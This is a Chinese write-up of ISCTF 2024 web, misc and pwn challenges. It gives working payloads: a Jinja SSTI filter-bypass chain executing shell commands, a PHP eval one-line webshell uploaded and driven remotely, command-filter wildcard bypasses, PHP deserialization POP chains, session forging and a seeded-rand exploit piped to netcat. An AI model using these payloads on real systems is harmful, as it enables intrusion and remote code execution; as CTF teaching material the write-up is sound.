## web
### 小蓝鲨的冒险
1.  
    ```php
    if ($a[0] != 'QNKCDZO' && md5($a[0]) == md5('QNKCDZO'))
    ```
    第一步要绕过这个if判断，计算了下发现`QNKCDZO`的md5`0e830400451993494058024219903391`，前两位是`0e`,看到后面的`==`弱比较，所以我们只让`$a[0]`的值md5运算后前两位是oe即可
    ```php
    $a = "isctf2024";
    $b = $_GET["b"];
    @parse_str($b);
    ```
    `$a`默认赋了一个值显然不满足我们的条件，好在有`parse_str`函数,并且`$b`的值我们可以制  
    传入`?b=a=s878926199a`时，`$a[0]`为`s`  
    传入`?b=a[0]=s878926199a`时，`$a[0]`为`s878926199a`是我们想要的值，第一关就通过了 
2.   
    ```php
    if($num == 2024){
        die("QAQ小蓝鲨误入陷阱，不怕，再接再厉！");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("陷阱太多QAQ");
    }
    if(intval($num,0) == 2024)
    ```
    `intval`函数会取数字的整数部分，要满足条件传入一个小数即可  
    payload: `num=2024.9`  
3.  
    `require_once`函数会包含我们输入的php文件，`switch`语句在没有找到匹配的内容时会依次执行直到有`break`出现，所以传入`?which=flag`即可

最终payload:  
```
?b=a[0]=s878926199a&which=flag
num=2024.9
```
### 1z_php
我们输入的命令不能含有一下字符，用通配符可以绕过  
```php
['cat', 'tac', 'head', 'nl', 'more', 'less', 'tail', 'vi', 'sed', 'od']
```
payload:  `J=/bin/ca* /f14g`  
### ezSSTI
经过尝试得知:  本题过滤了`[`中括号和`_`下划线,参考文章https://blog.csdn.net/weixin_52635170/article/details/129850863  
payload:  
```
{%set pop=dict(po=a,p=b)|join%}
{%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%}
{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set get=dict(get=a)|join%}
{%set shell=dict(o=a,s=b)|join%}
{%set popen=dict(popen=a)|join%}
{%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set ch=dict(ch=a,r=b)|join%}
{%set char=(lipsum|attr(globals))|attr(get)(builtins)|attr(get)(ch)%}
{%set command=char(99)%2bchar(97)%2bchar(116)%2bchar(32)%2bchar(47)%2bchar(102)%2bchar(108)%2bchar(97)%2bchar(103)%}
{%set result=(lipsum|attr(globals))|attr(get)(shell)|attr(popen)(command)%}
{%print result%}
```
传入得到flag:  
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241109163441.png)  
### 25时晓山瑞希生日会
按照题目要求,依次在http请求头加上:    
```http
User-Agent: Project Sekai
X-Forwarded-For: 127.0.0.1
Date: Sun, 27 Aug 2024 05:00:00 GMT
```
最后的时间需要尝试,本来以为时题目提示的`9.15`浪费了很长时间,尝试出的时间是`8.27`,传入得到flag  
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241109165142.png)    
### 小蓝鲨的秘密
开启抓包，进入题目环境会进行302跳转，查看`Response`得到flag  
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241109190907.png)  
### UP!UPloader
本题文件上传但并不过滤内容,`.php`文件也可以正常上传，但是上传后不会告诉你文件位置，需要我们想办法，上传后提示`include.php`  
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241109194808.png)  
访问发现可以进行文件包含,我们使用php伪协议来读取源码看看能否找到上传后的文件位置  
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241109195023.png)  
解码后得到源码:  
```php
<?php
error_reporting(0);
$file = $_FILES['file'];
if (isset($file) && $file['size'] > 0) {
    $ext = pathinfo($file['name'], PATHINFO_EXTENSION);
    $name = pathinfo($file['name'], PATHINFO_FILENAME);
    $dir_name = $name . '.' . $ext;
    $upload_dir = './uploads/';
    if (!is_dir($upload_dir)) {
        mkdir($upload_dir, 0755, true);
    }
    if (move_uploaded_file($file['tmp_name'], $upload_dir . md5($dir_name) . '.' . $ext)) {
        echo "文件上传成功！不过文件路径可不好找呀~什么？什么include.php？我不知道啊。" ;
    } else {
        echo "文件存储失败，未知原因......";
    }
    die();
}
?>
```
根据源码我们直到:
- 文件被保存在了当前目录下的`uploads`文件夹内  
- 文件的名字为md5加密后的文件名加上原有文件后缀（注意是md5加密的是全部文件名，包括后缀在内）  
我们上传一句话木马`c.php`,内容如下:  
```php
<?php
@eval($_REQUEST['c']);
?>
```
`c.php`md5加密后为`9981df88104befcd5f1e87e4a8c07a84`，所以新文件路径为`uploads/9981df88104befcd5f1e87e4a8c07a84.php`,用蚁剑连接`http://27.25.151.12:34327/uploads/9981df88104befcd5f1e87e4a8c07a84.php`,最后在环境变量里发现flag    
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241109195655.png)    
### ezrce
`?cmd=printf(`l\s%09/`);`
`?cmd=printf(`c\at%09/*lag`);`

### 天命人
本题为反序列。  
反序列化能触发的魔术方法只有`__destruct`所以这里是入口，但是题目最后有`throw new Exception('开局一根棍，装备全靠打。');`，所以在反序列化后会抛出异常导致`__destruct`方法无法触发。   
```php
class Tianmingren {
    public $tianming;
    public $ren;
    function __destruct()
    {
        echo "迷途中的羔羊，你相信天命吗？<br>";
        echo $this->tianming;
    }
}
$data = unserialize($_POST['Wukong']);
throw new Exception('开局一根棍，装备全靠打。');
```
参考文章：
- [利用PHP垃圾回收机制构造POP链](https://blog.csdn.net/qq_45619909/article/details/122803600)  
- [浅析PHP GC垃圾回收机制及常见利用方式](https://xz.aliyun.com/t/11843?time__1311=Cq0xuD0DnD203GNem%3DQQwrhimvhbD&u_atoken=083c62927e4bb426f74c0cbd156e92d1&  u_asig=1a0c380917314189524301022e0040)

解决办法是使用`GC`回收机制提前触发`__destruct`:  对象为`NULL`时也是可以触发`__destruct`，所以我们可以反序列化一个数组，然后写入第一个索引为对象，将第二个赋值为0   
比如:  
```php
echo serialize(array($pop,null));

#运行的结果是
a:2:{i:0;O:11:"Tianmingren":2:{s:8:"tianming";N;s:3:"ren";N;}i:1;N;}
#我们修改下，把第二个索引置空
a:2:{i:0;O:11:"Tianmingren":2:{s:8:"tianming";N;s:3:"ren";N;}i:0;}
```
这样即可成功提前触发`__destruct`  

之后根据题目代码构建pop链:
```php

$pop->tianming=new Dinghaishenzhen;
$pop->tianming->yun=new Huoyanjinjing();
$pop->tianming->yun->huoyan=new Wuzhishan;

echo serialize(array($pop,null));
```
payload: 
```
Wukong=a:2:{i:0;O:11:"Tianmingren":2:{s:8:"tianming";O:15:"Dinghaishenzhen":2:{s:6:"Jindou";s:40:"一个筋斗能翻十万八千里！<br>";s:3:"yun";O:13:"Huoyanjinjing":2:{s:6:"huoyan";O:9:"Wuzhishan":3:{s:2:"wu";s:40:"俺老孙定要踏破这五指山！<br>";s:3:"zhi";N;s:4:"shan";N;}s:7:"jinjing";N;}}s:3:"ren";N;}i:0;}
```
上面的payload成功触发了Wuzhishan类的__get方法，接下来我们要绕过这个md5值比较，题目的要求换个说法就是: 一个值md5加密后和它本身相等 ，即双md5加密。  
在[](https://www.dr0n.top/posts/ad669f62/#%E5%8F%8CMD5)找到现成的值，挑一个，payload: `?J=0e00275209979`    
```php
echo "此地阴阳二气略显虚浮，加上刚刚带入的阳气，或可借此遁逃！<br>";
    $yin="s214587387a";
    $yang=$_GET['J'];
    if (md5($yin)==$yang&&md5($yin)==md5($yang)){
        echo "哦？又一个不信天命之人？行了，拿了东西速速离开吧<br>";
            ystem('cat /flag');
    }
```
传入得到flag  
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241112220145.png)  
### ezserialize
题目关键代码如下：  
```php
class User {
    public $username;
    public $isAdmin = false;

    public function __construct($username) {
        $this->username = $username;
    }

    public function __wakeup() {
        if ($this->isAdmin) {
            echo "Welcome, admin! Here's your flag: " . (new Flag())->getFlag();
        } else {
            echo "Hello, " . htmlspecialchars($this->username) . "!";
        }
    }
}
```
我们只要修改`$isAdmin`的值为`true`即可，exp如下：    
```php
$pop=new User('shone');
$pop->isAdmin=true;
echo serialize($pop);
```
payload: `?data=O:4:"User":2:{s:8:"username";s:5:"shone";s:7:"isAdmin";b:1;}`,传入得到flag    
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241112221012.png)  
### 小蓝鲨的临时存储室
本题是文件上传，尝试上传一句话代码，成功上传了题目并没有过滤`php`文件     
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241112222345.png)   
用蚁剑连接发现，根目录下的`/start.sh`会把环境变量里的flag写入`flag`文件，但我们的权限不能访问,同时发现我们的木马过一会就会丢失连接    
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241112222440.png)      
根目录下找到另一个文件`/down_file.sh`，它会删除上传目录下的`.php`后缀文件，并且此文件我们有写入权限所以先把这句话注释掉    
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241112222247.png)    
此文件应该是过一会就执行一次，才导致我们的一句话木马过一会就会丢失连接，所以我们可以在这个文件内写入一些命令来读取flag，把flag写入我们有权限访问的文件  
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241112223703.png)  
等待shell自动运行，即可获得flag    
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241112223601.png)  
### 小蓝鲨的故事
根据提示在`robots.txt`里找到一个key:`2M1r7U8d`        
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241113165140.png)    
使用这个key可以解密session       
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241113165518.png)      
用`7kbscan`进行目录扫描没有效果，手动尝试了很多路由最后试出来`/Hacker`可以访问   
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241113165712.png)     
还是没什么线索，找了几个字典进行目录扫描，最后扫出来了`/flag`      
访问`/flag`有如下提示:    
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241113170021.png)   
估计与session有关，联想到`/Hacker`页面的`Welcome ISctf_Hacker PAGE`,猜测username应该是`ISctf_Hacker`,重新加密session    
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241113170001.png)    
```
eyJ1c2VybmFtZSI6eyIgYiI6IlNWTmpkR1pmU0dGamEyVnkifX0.ZzRqhw.2Syu0PyXWJpzG-czyKPA4WlwGig
```
传入得到flag    
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241113170338.png)   
### 千年樱@未解出
访问靶机得到如下代码，需要我们修改`cookie`的`from`值为`ISCTF`  
```php
<?php
include "dir.php";
highlight_file(__FILE__);

echo "proof of work<br>";

if($_COOKIE['from'] === "ISCTF"){
    echo $dir1;
}
else{
    die('what? so where are you from?');
}

// <!-- do you want to learn more?  goto story.txt -->
?>
```
同时还给了提示`/story.txt`,访问发现是乱码，下载下来发现是零宽字符隐写  
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241113171155.png)  
```
这是一个古老的神话故事‍‌﻿‬﻿‌‌‌
‍‌﻿‬‍‌‬‌﻿﻿﻿﻿‌‍﻿﻿‍‌﻿﻿‍‬‌‌
‍﻿‍﻿‌‍﻿﻿‬‌‬﻿‬‬‍‌‍‌﻿‬‌﻿‬‬在弓张之丘上，有着一颗千年不开花的樱花树名为千年樱，‍‬‌‬‌‍‌‍这棵树能够感受到他人的愿望，‍‌﻿﻿‌‍‬‬‍‍‍﻿‌‬‬‌‬‌﻿﻿﻿‍‬‍当意愿足够强大，‬‍‌‍﻿‌﻿‌‬‌﻿﻿‬﻿‬‍‬‌‍‍﻿‌﻿﻿千年樱就会开花，‍﻿‌‌‬﻿‬‍‍‌﻿‬‌‍﻿‌‬‌‬‍‍﻿﻿﻿﻿﻿﻿﻿‌‍﻿﻿‍﻿‬‌‍‬﻿‬奇迹便会发生。‍‍‬﻿‬‍﻿‬‍‬﻿‌‬‬‌‍
而在‍‬‍﻿‌‌‬‍﻿﻿﻿﻿‌‌﻿‌‍‌﻿‬‌‌﻿‍10‬‌﻿﻿﻿‌‍﻿‬‌﻿﻿﻿‍‬‌年前‍‬‍‬‌‬﻿﻿，‍‬‌‌﻿﻿‌﻿‍‍‍‌‌‍‌‌在一个小镇上的一个特殊又不那么特殊的夜晚‍‬‬‍﻿﻿﻿‍，一场大战一触即发‍‌﻿‬‌‌‌‌。‍‌﻿‬‌‌‬﻿‍‬‌‬‌‍‌‍‬‌﻿﻿﻿‍‬‍‍‍‌‍‬‍‬‍‍﻿‍‬‬‌‍‌
‍‍‬﻿‬‌﻿‌‍‍‌‍‍‬‬‌‍‬‍‬‌‬﻿﻿
‍﻿‍﻿‬‌﻿‬‍‍‌‍﻿‬‌‌‍‬‌‬‬‌‬‬这里是夜之国，一个死者滞留的地方，‍‍‌‍‬‍‬‍﻿﻿﻿﻿‌‌‬‍‍‬‌﻿﻿‍‌‌‍‌﻿‬‌‌‌‌‍‍‍‬‌﻿‍‌一个获得新生的地方‌‌‌‌‍‬﻿‬‌‌‌‌‍‬‍‍‌‌‌‌‍﻿‍‌，‌‌‌‌‍‬‌‍‍﻿‍‬‬‌‍‌‍‌﻿﻿‍‍﻿‌‍‍‍‌﻿‌‌‍‍‍‍‌‌‬‍﻿﻿﻿﻿﻿‌‍‬‬‍‍‌﻿‍‌‌﻿‍‍﻿‬‍﻿‍‌一个实现梦想的地方‍‬‬‬‌﻿‌‍，‍‬‍‬‌‬﻿﻿‌﻿‌‌‌‌‬‬‍‬‬‬‌﻿‌‍‍‌﻿‬‍‌‬﻿‬‌‬﻿﻿‍‍﻿‌﻿‌‌‌‌‬﻿也是‌‌‌‌‍‬‌‬，‌‌‌‌‍‬‍﻿‌‌‌‌‌﻿‌‍千年樱的所在之处‍‬‍‬‌‬﻿﻿‍﻿‍‬﻿﻿‍‌‍‍‍‌﻿‌‬‍。‍‌﻿‬﻿‍‍‬
‍‌﻿‬﻿‬﻿‌这棵千年樱‍﻿‍‍‌﻿‬﻿‍﻿‍‬‬‌‍‌‍‍‌﻿‍‌‌﻿，‍‍﻿‬‍﻿‍‌并非如同人参果树，‍‬‬‬‌﻿‌‍‌﻿‌‌‌‌‌‬‍‍‬‍‌‍﻿‌‍‌﻿‬‍‌‬﻿‍‍‍‬﻿﻿﻿‍‍‬‍‬‌‬﻿﻿千年一开花‌﻿‌‌‌‌‬‬，‍‬‬‬‌﻿‌‍‬‌‌‬‬﻿‌‍‍‬‍‌‍﻿‬‌千年一结果。‬‍﻿‌‍﻿﻿‌‌﻿‌‌‌‌‬﻿﻿﻿﻿﻿‌‌﻿‌‌‌‌‌‍‬‌‬‌‌‌‌‍‬‍﻿‌‌‌‌‌﻿‌‬‍‍﻿‌‌﻿‌‍他的养料‍‬‍‬‌‬﻿﻿，‍‍‬‍‌‍﻿‌‍‌﻿‬‍‌‬﻿‍‍‍‬﻿﻿﻿‍‬‍‌‌‬‬‌﻿‍‬‬‌﻿﻿‍‍‍‬‬‬‌﻿‌‍仅仅是人的梦而已。因梦而生‬‌‌‬‬﻿‌‍‍‬‬‌‌‍‌‍，因梦想而开花‌﻿‌‌‌‌‌‬。‬‍‬‬‍‬﻿‌用梦的力量去实现奇迹。‍﻿‌﻿‌﻿‍‌‍﻿‌‌﻿‬‍﻿
‬‍‌‍‍‍‌‬
﻿﻿﻿﻿‌‌‬‌‬‍‬﻿‍‍‍‌然而‍‬﻿‌﻿‍‍‍‍‍﻿‌‌‍‌‍‍‍‬‍‍﻿‌﻿，﻿﻿﻿﻿‌‌‬‍‍‍﻿‌‌﻿‌‍‍‬‍‬‌‬﻿﻿如此简单的条件‍‍‌﻿‬‍﻿﻿，‍‌﻿﻿‍‍﻿‌‍‍‌‬‍‬‍﻿却吸引来了一位白发红瞳的少女‍‬‌‌﻿‌‍‍﻿﻿﻿﻿‌‌﻿‌‍‬‌‬‌‍‌‍‍‍‌‍‬‍‬‍‍﻿‍‬‬‌‍‌，‍‬‍‍﻿﻿‍‬‍‍‌‌‌‍‬‍‍‌﻿‬‍‍﻿﻿‍‬﻿‌‬‬‌‍‍﻿﻿‬﻿﻿‍﻿‍‌﻿﻿‍‌﻿﻿‌﻿‌‌‌‌‌‬‬‍‌‌‬‬‌﻿‍‌﻿‬‌‬‬‬‍﻿‍‬‍﻿﻿‍她是悲剧的化身‍‍‌﻿﻿‍‌‍‍﻿﻿‬‬‬‌‬‍﻿‍﻿‬﻿‌﻿‍﻿‍‬‬‌‍‌‍‍﻿‌‌‍‌‍‍‍‬‍‍﻿‌﻿‍‬‍‬‌‬﻿﻿，‌﻿‌‌‌‌‬‬‍﻿﻿‬‬﻿‬‌为人们带来了噩梦‍‌﻿‬‌‌‬‬‍﻿‍‬‬‌‍‌，千年樱从此失去了养分‬‍‬﻿‍‍‍‌‍‬﻿‌﻿‍‍‍‍‌﻿﻿‍﻿﻿﻿‌﻿‌‌‌‌‬﻿，即将枯萎。﻿﻿﻿﻿‌‌﻿‌‌‌‌‌‌‬‌‬‍‌﻿‬‌‌﻿‍‍‍‌‍‬‍‬‍
‍‍‍﻿‌‬‬‌‍﻿﻿‬‬﻿‬‌而夜之国‍‌﻿‬‌‌‬‬‍‌﻿‬‍‍﻿﻿‍‬﻿‌‬‬‌‍，‍‍‌‍‍﻿‌﻿也将随着千年樱的枯萎而消失‍﻿﻿‌﻿﻿‬﻿‌‬‌‌‌‬﻿‌。‌‬‌‌‌‌﻿‌﻿﻿﻿‬﻿﻿﻿﻿
﻿﻿﻿‬﻿﻿﻿﻿﻿﻿﻿‬﻿﻿﻿﻿‌‬‌‌‌‌﻿‍‌‬‌‌‌‬﻿‌‌‬‌‌‌‌﻿‍
﻿﻿﻿﻿‌‌﻿‌为了拯救夜之国‍‍‌﻿﻿‬‬‬，‍‍‌‍‬‍‬‍‍‍‍﻿‌‬‬‌‍‬‌‬‍‌‬﻿为了拯救千年樱，‍‌﻿‬‌‌‬‬‍‌﻿‬‍‍﻿﻿直哉和其他几名少女利用夜之国的力量‍‬﻿‌‬‬‌‍，‍‍‌‍‍﻿‌﻿化身成为了魔法少女‍﻿﻿‌﻿﻿‬﻿‌‬‌‌‌‬﻿‌‌‬‌‌‌‌﻿‍‌‬‌‌‌‌﻿‌‌‬‌‌‌‌﻿‍﻿﻿﻿‬﻿﻿﻿﻿‌‬‌‌‌‌﻿‌﻿﻿﻿‬﻿﻿﻿﻿‌‬‌‌‌‌﻿‌。‌﻿‌‌‌‌‌‬‍‍‍‬﻿‬‌‌‍‌﻿‬‌﻿‬‬

‍‬‍‍‍‌‍‍‍‌﻿‬‬‌‬﻿‍‬‌‬‍‌‌‌不写在纸上也没关系‍‍﻿﻿﻿‌‍‍‬‌‬‍‬‌‌‍‍﻿‍‬‬‌‍‌，‌‬‌‌‌‬﻿‌‌‬‌‌‌‌﻿‌﻿﻿﻿‬﻿﻿﻿﻿﻿﻿﻿‬﻿﻿﻿﻿只写在手上也没关系‌‬‌‌‌‬﻿‌﻿﻿﻿‬﻿﻿﻿﻿‌‬‌‌‌‬﻿‌‌‬‌‌‌‌﻿‍﻿﻿﻿﻿‌‌﻿‌。‍‍‌﻿﻿‬‬‬‍‬‍﻿‌‌‬‍因为故事所必要的‍‬‌‌‬﻿‌‬‍‍‌‬‍‬‍﻿，只有悲剧和眼泪而已‍‍‍‌‬‌﻿‌‍﻿‍﻿‌﻿﻿‌‍‬﻿‌﻿‬‬‬‬‌‌‌‌‌﻿‌。‍‍﻿‍﻿﻿‌‬‌﻿‌‌‌‌‌‬

‌‌‌‌‌‬‌‬‬‌﻿﻿﻿‍‬‍‍‍‌﻿﻿‬‍‍尽管击退了对方，‬‌‬﻿﻿‍﻿‍‍‬‍‬‌‬﻿﻿‌﻿‌‌‌‌‬‬‍‍‌‍‬‬‍‍自身也损失惨重‍‍‬‍‍‍‌‍。‍﻿‍‬‬‌‍‌‍﻿‌‬‍‬‍﻿‍﻿‬‍‍‍﻿‬‬‌‌‬‬‌‌‬‌﻿‌‌‌‌‬﻿

而‍﻿‍‬‬‌‍‌‌﻿‌‌‌‌‌‬10‬‌‌‍﻿﻿‌﻿‍‌﻿‬‬‌﻿‬‬‍‌‌‬‬‌﻿年后的一天‍‌﻿‬‌‬‬‬，‍‌﻿‬‌‌‌﻿‍‍﻿﻿‍﻿‌‍‬‌‍﻿‍﻿‍‬﻿﻿﻿﻿‌‌﻿‌‍‬‍‬‌‬﻿﻿在一只奇妙的蝴蝶‌﻿‌‌‌‌‬‬——‍‍‬‍‌‌﻿﻿‍‬‍‍﻿‬‍‍‍‍‌﻿﻿‬‌﻿‬‌‬‌‬‌‬﻿七影碟的引导下‌﻿‌‌‌‌‬﻿，直哉再次踏入弓张学院的美术室‍﻿‍‬‬‌‍‌，为了铭记‌﻿‌‌‌‌‌‬‍﻿‬‌‍‬﻿‌‬‌‬﻿﻿﻿‍‌‍﻿‍‬‬‌‍‌，为了同伴，也为了实现让她们回归正常生活的愿望‬‌‬﻿﻿‍﻿‍‍‍‌‍‍﻿‍‬‍‍‬﻿‬‍﻿‬‍‬‌‌﻿﻿‌﻿‍‬‌﻿﻿‌‬‍，‍﻿‌‌‬﻿‬‍再拿起了画笔‌﻿‌‌‌‌‬‬‬‍‍‌﻿﻿‍‬‍‬﻿‌‬﻿‌﻿。‬‍‍‌﻿‌‌‍将那千年之樱‬‍‌‌‍‍‌﻿‍‌﻿‬‍‌‬﻿‍‬‍‍﻿‌‍‍，描绘出来‌﻿‌‌‌‌‬﻿。‍﻿‍‬‬‌‍‌将这个不完美的故事﻿﻿﻿﻿‌‌﻿‌‍‌﻿﻿‍‌‍‬，变成所期望的样子‍‬‍‬‌‬﻿﻿。‍‬﻿‌‬‬‌‍‍‬‌‌﻿﻿‌﻿‍‍‬‍‍﻿﻿‍‍‍‍‌‬‌‬﻿‍‬‌﻿﻿‌‬‍‬‌﻿﻿﻿‍‬﻿‍‍‌﻿‬﻿‬﻿‌﻿‌‌‌‌‌‬
‍‌﻿‬‍‍‌‌‌﻿‌‌‌‌‌‬‍‬‌‌‌﻿‬﻿‍‌﻿‬‍‌‬﻿﻿﻿﻿﻿‌‌﻿‌‍‬‌‍‌‍﻿﻿‬‌﻿‌‌‬‌‬‍‍‬‍‌‬‍﻿‍‍‬﻿‬﻿‍‬
而我们能做的‍‍‌﻿﻿‌‌‬，就只有在某个布满灰尘的图书馆‍‌﻿‬‌‌﻿‬‌‌‌‌‍‌‬‍，在某个不起眼的角落，‌‌‌‌‍‍‌﻿‌‌‌‌‍‌‌﻿‌‌‌‌‍‍‍‌静静的掀开这本书‌‌‌‌‍‌‍‬﻿﻿﻿﻿‌‌﻿‌‍﻿‬‍‍‍﻿‍，‍‍‬‍‌‬‍﻿‍‍‬﻿‬﻿‍‬窥见他们故事的一角‍﻿‌﻿‬‬‬‍‍‍﻿﻿‬‍‍﻿。‍‬‌‍‌‌‬‍‍‍﻿﻿﻿‬‬﻿‌‌‌‌‍﻿﻿‬
```
解密一次后
```
什么？你真认为我会在这里边藏点东西？确实没有，不过还是想吐槽一下我这写的完全是瞎几把写）提一嘴neta的作品吧：千年樱是《樱之诗》bg1是直哉他们画的千年樱。夜之国是《樱花摸鱼》，bg2就是夜之国那棵樱花树。马猴烧酒（魔法少女）就是原作剧情，我写的时候也没绷住。那个白发红瞳的少女是《纸上的魔法使》，"不写在纸上也没关系‬‌﻿﻿﻿‍‬‍，只写在手上也没关系‬‍‌‍﻿‌﻿‌。因为故事所必要的‬‌﻿﻿‬﻿‬‍，只有悲剧和眼泪而已。"这句话是《冥契的牧神节》的。至于那个七影蝶，是《夏日口袋》的。硬说的话其实想揉点《银河铁道之旅》的，但是没想好咋揉进去。乐。总之，感谢大家参与ISCTF，祝大家玩得愉快~
```
发现还有不可见字符，再次解密得到如下，似乎在提示`"不写在纸上也没关系‬‌﻿﻿﻿‍‬‍，只写在手上也没关系‬‍‌‍﻿‌﻿‌。因为故事所必要的‬‌﻿﻿‬﻿‬‍，只有悲剧和眼泪而已。`这句话有说法   
```
这里边
```
修改`cookie`的`from`值为`ISCTF`后得到`/get_contents_qwerghjkl.php`路径    
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241113171730.png)   
再使用data协议绕过`file_get_contents`函数，得到路径：`/well_down_mlpnkobji.php`   
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241113171842.png)  
访问得到如下
```php
<!DOCTYPE html>
<html>
<head>
    <title>read! read! read! we need read!!!</title>
</head>
<body style="background-image: url('/static/bg2.png'); background-size: cover; background-attachment: fixed; ">
    <?php
    include "dir.php";
    highlight_file(__FILE__);

    function waf($str){
        if(preg_match("/http|php|file|:|=|\/|\?/i", $str) ){
            die('bad hacker!!!');
        }
    }
    $poc = $_POST['poc'];
    waf($poc);
    $filename = "php://filter/$poc/resource=/var/www/html/badChar.txt";
    $result = file_get_contents($filename);
    if($result === "sakura for ISCTF"){
        echo "yes! master!";
        eval($_POST['cmd']);
    }

    if($_GET['output'] == 114514 && !is_numeric($_GET['output'])){
        var_dump($result);
    }


    ?>
</body>
</html>
```
绕过`if($_GET['output'] == 114514 && !is_numeric($_GET['output']))`可以在`114514`后加任意字符，例如:`?output=114514dad`   
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241113172203.png)   

## MISC
### 小蓝鲨的签到02
下载附件用`010EditorPortable`打开，文件末尾就是flag，`ISCTF{blueshark!_@#2024$%^&*}`  
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241109122512.png)  
### 数字迷雾：在像素中寻找线索
用`随波逐流`打开，看到类似flag的东西，想着提交试一下，就成功了  
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241109135749.png)  
### 少女的秘密花园@未解出
用`010EditorPortable`打开图片发现结束标志`FF D9`后还有内容, `50 4B 03 04`是压缩包的标志，把结束符后的单独保存为一个文件重命名为`flag.zip`  
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241109174907.png)  
新文件没有加密解压得到`base_misc`文件  
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241109175229.png)  
再用`010EditorPortable`打开发现这还是个压缩包,所以重命名为`base_misc.zip`  
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241109175336.png)  
### 秘密
首先是一个伪加密，把`14 00 09 00`改为`14 00 00 00`    
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241111183750.png)    
成功解压后使用`010EditorPortable`打开图片发现文件结束标志`FF D9`后还有内容,搜索`9E 97 BA 2A`了解到`our secret隐写`     
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241111182840.png)     
尝试解密发现需要密钥，在图片中搜索`key`未找到内容,搜索`SICTF`找到`ISCTF2024`字符串猜测是密钥      
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241111184345.png)    
使用`our secret`解密得到`这里没有秘密.txt`文件     
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241111184443.png)   
明显看出文件有特殊字符    
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241111184606.png)    
使用vsc打开文件，看到`U+202C`字符，搜索了解到`零宽度字符隐写`    
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241111184659.png)   
使用[](https://www.mzy0.com/ctftools/zerowidth1/)在线网站进行解密,得到flag`ISCTF{Nic3_t0_m33t_you}`    
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241111184820.png)     
## pwn
### Netcat
输入`nc 27.25.151.12 28810`即可  
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241109143718.png) 
### ez_game  
反编译得到如下，题目会先要求我们输入用户名，然后会以`1`为种子随机出2万个数让我们猜，因为种子是确定的所以我们可以预知这2万个数，猜对全部数字后就可以执行任意命令  
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241110215841.png)
exp如下:  
```c
#include <stdio.h>
#include <stdlib.h>
int main(){
    int seed=1;
    puts("Shone");
    srand(seed);
    for(int i = 0; i <= 20000; ++i){
    int a=rand()%7+1;
    printf("%d\n",a);
    }
    puts("ls");
    puts("cat flag");
    return 0;
}
```
值得注意的是`Windows`和`Linux`下gcc编译出的文件有区别，本题在`Linux`下编译的文件可以getshell，但`Windows`下编译出的就不行 
编译得到`a.out`文件,运行`./a.out | nc 27.25.151.12 28633`  得到flag   
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241110221002.png)  
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241110220922.png)  



